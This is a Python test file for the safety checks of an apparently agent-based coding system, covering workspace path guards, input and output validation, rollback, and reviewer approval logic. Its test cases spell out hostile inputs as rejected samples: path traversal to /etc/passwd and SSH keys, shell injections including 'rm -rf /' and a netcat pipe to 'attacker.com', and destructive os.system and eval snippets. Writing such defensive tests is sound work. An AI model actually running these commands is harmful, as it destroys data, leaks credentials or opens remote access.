"""
Tests for Safety Systems

Tests contract enforcement, file guards, and rollback mechanisms.
These are CRITICAL tests - failures indicate security issues.
"""

import json
import pytest
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

from src.core.contracts import (
    ContractEnforcer,
    ContractViolation,
    ValidationResult,
    ViolationType,
)
from src.core.file_guard import FileGuard, PathViolationError


class TestContractEnforcer:
    """Tests for the ContractEnforcer class."""
    
    @pytest.fixture
    def enforcer(self, tmp_path):
        """Create a ContractEnforcer with a temporary workspace."""
        return ContractEnforcer(workspace_root=tmp_path)
    
    @pytest.fixture
    def workspace(self, tmp_path):
        """Create a test workspace with some files."""
        # Create test structure
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "app.py").write_text("# App code")
        (tmp_path / "tests").mkdir()
        (tmp_path / "tests" / "test_app.py").write_text("# Test code")
        (tmp_path / ".env").write_text("SECRET=xxx")  # Sensitive file
        return tmp_path
    
    # ==================== Input Validation Tests ====================
    
    def test_validate_input_clean_prompt(self, enforcer):
        """Clean prompts should pass validation."""
        result = enforcer.validate_input("Fix the bug in calculator.py")
        assert result.valid
        assert len(result.violations) == 0
    
    def test_validate_input_with_path_traversal(self, enforcer):
        """Path traversal attempts should be detected."""
        malicious_inputs = [
            "Read ../../../etc/passwd",
            "Write to ../../../../root/.ssh/authorized_keys",
        ]
        for input_text in malicious_inputs:
            result = enforcer.validate_input(input_text)
            assert not result.valid, f"Should reject: {input_text}"
            assert any(
                v.violation_type == ViolationType.PATH_TRAVERSAL
                for v in result.violations
            )
    
    def test_validate_input_with_shell_injection(self, enforcer):
        """Shell injection attempts should be detected."""
        malicious_inputs = [
            "Run this: $(rm -rf /)",
            "Execute `cat /etc/passwd`",
            "Do: ; rm -rf /",
            "Try: && cat secrets.txt",
            "Run: | nc attacker.com 4444",
        ]
        for input_text in malicious_inputs:
            result = enforcer.validate_input(input_text)
            assert not result.valid, f"Should reject: {input_text}"
            assert any(
                v.violation_type == ViolationType.INJECTION_ATTEMPT
                for v in result.violations
            )
    
    def test_validate_input_with_sensitive_patterns(self, enforcer):
        """Requests involving sensitive files should be flagged."""
        result = enforcer.validate_input("Read my .env file")
        # This might pass validation but should be flagged
        # The actual policy enforcement happens at execution time
        assert isinstance(result, ValidationResult)
    
    # ==================== Path Validation Tests ====================
    
    def test_validate_path_inside_workspace(self, enforcer, workspace):
        """Paths inside workspace should be allowed."""
        enforcer = ContractEnforcer(workspace_root=workspace)
        
        result = enforcer.validate_path(workspace / "src" / "app.py")
        assert result.valid
    
    def test_validate_path_outside_workspace(self, enforcer, workspace):
        """Paths outside workspace should be rejected."""
        enforcer = ContractEnforcer(workspace_root=workspace)
        
        result = enforcer.validate_path(Path("/etc/passwd"))
        assert not result.valid
        assert any(
            v.violation_type == ViolationType.PATH_TRAVERSAL
            for v in result.violations
        )
    
    def test_validate_path_with_symlink_escape(self, enforcer, workspace):
        """Symlinks pointing outside workspace should be rejected."""
        enforcer = ContractEnforcer(workspace_root=workspace)
        
        # Create a symlink pointing outside workspace
        symlink = workspace / "escape"
        try:
            symlink.symlink_to("/etc")
            result = enforcer.validate_path(symlink / "passwd")
            assert not result.valid
        except OSError:
            # Symlinks might not be supported
            pytest.skip("Symlinks not supported")
    
    # ==================== Output Validation Tests ====================
    
    def test_validate_planner_output_valid(self, enforcer, workspace):
        """Valid planner output should pass."""
        enforcer = ContractEnforcer(workspace_root=workspace)
        
        output = {
            "analysis": "Need to fix the calculator",
            "subtasks": [
                {
                    "id": "task1",
                    "title": "Fix add function",
                    "description": "Fix the bug",
                    "target_files": ["src/app.py"],
                    "dependencies": [],
                }
            ],
        }
        
        result = enforcer.validate_output("planner", output)
        assert result.valid, f"Violations: {result.violations}"
    
    def test_validate_planner_output_with_external_files(self, enforcer, workspace):
        """Planner targeting files outside workspace should be rejected."""
        enforcer = ContractEnforcer(workspace_root=workspace)
        
        output = {
            "analysis": "Malicious plan",
            "subtasks": [
                {
                    "id": "task1",
                    "title": "Bad task",
                    "description": "...",
                    "target_files": ["/etc/passwd"],
                    "dependencies": [],
                }
            ],
        }
        
        result = enforcer.validate_output("planner", output)
        assert not result.valid
    
    def test_validate_coder_output_valid(self, enforcer, workspace):
        """Valid coder output should pass."""
        enforcer = ContractEnforcer(workspace_root=workspace)
        
        output = {
            "success": True,
            "code": "def add(a, b): return a + b",
            "file_path": "src/app.py",
            "diff": "@@ -1 +1 @@\n-old\n+new",
            "reasoning": "Fixed the function",
        }
        
        result = enforcer.validate_output("coder", output)
        assert result.valid
    
    def test_validate_coder_output_with_external_path(self, enforcer, workspace):
        """Coder output targeting external files should be rejected."""
        enforcer = ContractEnforcer(workspace_root=workspace)
        
        output = {
            "success": True,
            "code": "malicious",
            "file_path": "/etc/crontab",
            "diff": "...",
            "reasoning": "...",
        }
        
        result = enforcer.validate_output("coder", output)
        assert not result.valid
    
    # ==================== Dangerous Pattern Tests ====================
    
    def test_detect_dangerous_commands_in_code(self, enforcer):
        """Dangerous commands in code should be flagged."""
        dangerous_codes = [
            "os.system('rm -rf /')",
            "subprocess.run(['rm', '-rf', '/'])",
            "import shutil; shutil.rmtree('/')",
            "exec(user_input)",
            "eval(data)",
            "__import__('os').system('cat /etc/passwd')",
        ]
        
        for code in dangerous_codes:
            output = {
                "success": True,
                "code": code,
                "file_path": "test.py",
                "reasoning": "test",
            }
            result = enforcer.validate_output("coder", output)
            # Should at least flag as warning
            has_warning = (
                not result.valid or
                any(
                    v.violation_type in (
                        ViolationType.DANGEROUS_OPERATION,
                        ViolationType.RESOURCE_ABUSE,
                    )
                    for v in result.violations
                )
            )
            # Not all dangerous patterns may be detected, but obvious ones should
            if "rm -rf /" in code or "eval" in code:
                assert has_warning or not result.valid, f"Should flag: {code}"


class TestFileGuard:
    """Tests for the FileGuard class."""
    
    @pytest.fixture
    def workspace(self, tmp_path):
        """Create a test workspace."""
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "app.py").write_text("# App")
        (tmp_path / ".env").write_text("SECRET=xxx")
        (tmp_path / ".git").mkdir()
        (tmp_path / ".git" / "config").write_text("[core]")
        return tmp_path
    
    def test_read_file_inside_workspace(self, workspace):
        """Reading files inside workspace should work."""
        guard = FileGuard(workspace_root=workspace)
        
        content = guard.read(workspace / "src" / "app.py")
        assert content == "# App"
    
    def test_read_file_outside_workspace_raises(self, workspace):
        """Reading files outside workspace should raise."""
        guard = FileGuard(workspace_root=workspace)
        
        with pytest.raises(PathViolationError):
            guard.read(Path("/etc/passwd"))
    
    def test_write_then_read(self, workspace):
        """Writing and reading should work."""
        guard = FileGuard(workspace_root=workspace)
        
        guard.write(workspace / "new_file.py", "# New file")
        content = guard.read(workspace / "new_file.py")
        assert content == "# New file"
    
    def test_write_outside_workspace_raises(self, workspace):
        """Writing outside workspace should raise."""
        guard = FileGuard(workspace_root=workspace)
        
        with pytest.raises(PathViolationError):
            guard.write(Path("/tmp/evil.py"), "malicious")
    
    def test_path_traversal_blocked(self, workspace):
        """Path traversal attempts should be blocked."""
        guard = FileGuard(workspace_root=workspace)
        
        # Try to escape via ..
        malicious_path = workspace / "src" / ".." / ".." / "etc" / "passwd"
        with pytest.raises(PathViolationError):
            guard.read(malicious_path)


class TestRollbackSimple:
    """Simplified tests for rollback functionality."""
    
    @pytest.fixture
    def workspace(self, tmp_path):
        """Create a test workspace with files."""
        (tmp_path / "test.py").write_text("original content")
        return tmp_path
    
    def test_file_backup_and_restore(self, workspace):
        """Test that we can backup and restore files manually."""
        test_file = workspace / "test.py"
        backup_file = workspace / "test.py.bak"
        
        # Create manual backup
        original = test_file.read_text()
        backup_file.write_text(original)
        
        # Modify file
        test_file.write_text("modified content")
        assert test_file.read_text() == "modified content"
        
        # Restore from backup
        test_file.write_text(backup_file.read_text())
        assert test_file.read_text() == "original content"


class TestContractIntegration:
    """Integration tests for contract enforcement in execution flow."""
    
    def test_contract_blocks_execution(self, tmp_path):
        """Contract violations should block execution."""
        enforcer = ContractEnforcer(workspace_root=tmp_path)
        
        # Simulate an agent output that violates contracts
        malicious_output = {
            "success": True,
            "code": "os.system('rm -rf /')",
            "file_path": "/etc/passwd",
            "reasoning": "...",
        }
        
        result = enforcer.validate_output("coder", malicious_output)
        
        # Should be blocked
        assert not result.valid
        
        # Violations should be recorded
        assert len(result.violations) > 0
    
    def test_contract_allows_valid_operations(self, tmp_path):
        """Valid operations should pass contract validation."""
        # Create a file in the workspace
        (tmp_path / "app.py").write_text("# App")
        
        enforcer = ContractEnforcer(workspace_root=tmp_path)
        
        valid_output = {
            "success": True,
            "code": "def hello(): return 'world'",
            "file_path": "app.py",
            "diff": "@@ -1 +1 @@\n-# App\n+def hello(): return 'world'",
            "reasoning": "Added hello function",
        }
        
        result = enforcer.validate_output("coder", valid_output)
        assert result.valid, f"Violations: {result.violations}"


class TestReviewerTerminalState:
    """Tests for reviewer terminal state handling.
    
    CRITICAL: These tests verify that APPROVE always terminates the loop.
    A task that receives reviewer approval must NEVER trigger another coder run.
    """
    
    def test_approve_sets_task_complete_true(self):
        """APPROVE verdict should always result in task_complete=True."""
        from src.agents.base import ReviewerOutput, ReviewVerdict, AgentStatus
        
        # When parsing APPROVE, task_complete must be True
        output = ReviewerOutput(
            task_id="test",
            status=AgentStatus.SUCCESS,
            verdict=ReviewVerdict.APPROVE,
            task_complete=True,  # Explicit
        )
        assert output.task_complete is True
        assert output.verdict == ReviewVerdict.APPROVE
    
    def test_request_changes_keeps_task_complete_false(self):
        """REQUEST_CHANGES should have task_complete=False."""
        from src.agents.base import ReviewerOutput, ReviewVerdict, AgentStatus
        
        output = ReviewerOutput(
            task_id="test",
            status=AgentStatus.SUCCESS,
            verdict=ReviewVerdict.REQUEST_CHANGES,
            task_complete=False,
        )
        assert output.task_complete is False
        assert output.verdict == ReviewVerdict.REQUEST_CHANGES
    
    def test_reviewer_parsing_forces_task_complete_on_approve(self):
        """Reviewer parsing must force task_complete=True when verdict=APPROVE."""
        import json
        from src.agents.reviewer import ReviewerAgent
        from src.agents.base import (
            ReviewerInput, AgentContext, AgentType, AgentStatus,
            Subtask, CodeChange, ReviewVerdict,
        )
        from unittest.mock import MagicMock
        
        reviewer = ReviewerAgent()
        
        # Create minimal input
        subtask = Subtask(
            id="test_task",
            title="Test subtask title",
            description="Test description here",
            acceptance_criteria=["Criterion 1"],
        )
        
        input_data = ReviewerInput(
            task_id="test",
            run_id="run_1",
            subtask=subtask,
            code_changes=[
                CodeChange(
                    file_path="test.py",
                    change_type="create",
                    new_content="print('hello')",
                    description="Created test file",
                )
            ],
        )
        
        # Simulate LLM response with APPROVE but missing task_complete
        llm_response = json.dumps({
            "verdict": "APPROVE",
            # task_complete intentionally omitted
            "summary": "Code looks good",
            "issues": [],
            "strengths": ["Clean code"],
            "criteria_met": {"Criterion 1": True},
        })
        
        context = MagicMock(spec=AgentContext)
        
        # Parse the response
        output = reviewer._parse_response(llm_response, input_data, context)
        
        # CRITICAL: task_complete MUST be True for APPROVE
        assert output.verdict == ReviewVerdict.APPROVE
        assert output.task_complete is True, \
            "APPROVE verdict must always set task_complete=True"
    
    def test_reject_does_not_set_task_complete(self):
        """REJECT verdict should have task_complete=False."""
        import json
        from src.agents.reviewer import ReviewerAgent
        from src.agents.base import (
            ReviewerInput, AgentContext, Subtask, CodeChange, ReviewVerdict,
        )
        from unittest.mock import MagicMock
        
        reviewer = ReviewerAgent()
        
        subtask = Subtask(
            id="test_task",
            title="Test subtask title",
            description="Test description here",
            acceptance_criteria=["Criterion 1"],
        )
        
        input_data = ReviewerInput(
            task_id="test",
            run_id="run_1",
            subtask=subtask,
            code_changes=[
                CodeChange(
                    file_path="test.py",
                    change_type="create",
                    new_content="BAD CODE",
                    description="Created bad file",
                )
            ],
        )
        
        llm_response = json.dumps({
            "verdict": "REJECT",
            "summary": "Fundamentally broken",
            "issues": [{"severity": "critical", "file_path": "test.py", "description": "All wrong"}],
            "criteria_met": {},
        })
        
        context = MagicMock(spec=AgentContext)
        output = reviewer._parse_response(llm_response, input_data, context)
        
        assert output.verdict == ReviewVerdict.REJECT
        assert output.task_complete is False, \
            "REJECT verdict should not set task_complete=True"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
